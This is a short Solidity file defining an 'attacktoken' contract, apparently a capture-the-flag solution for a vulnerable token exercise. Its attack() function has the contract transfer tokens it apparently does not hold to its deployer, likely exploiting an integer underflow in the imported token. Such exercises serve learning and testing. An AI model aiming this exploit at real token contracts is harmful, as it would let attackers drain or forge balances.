pragma solidity ^0.6.0;

import "./token.sol";
contract attacktoken{
    Token public tokenCon;
    address public owner;
    constructor( address Addr) public {
        tokenCon = Token(Addr);
        owner = msg.sender;
    }
    function attack(uint value) public returns(bool)
    {
        tokenCon.transfer(owner, value);
        return true;
    }
}
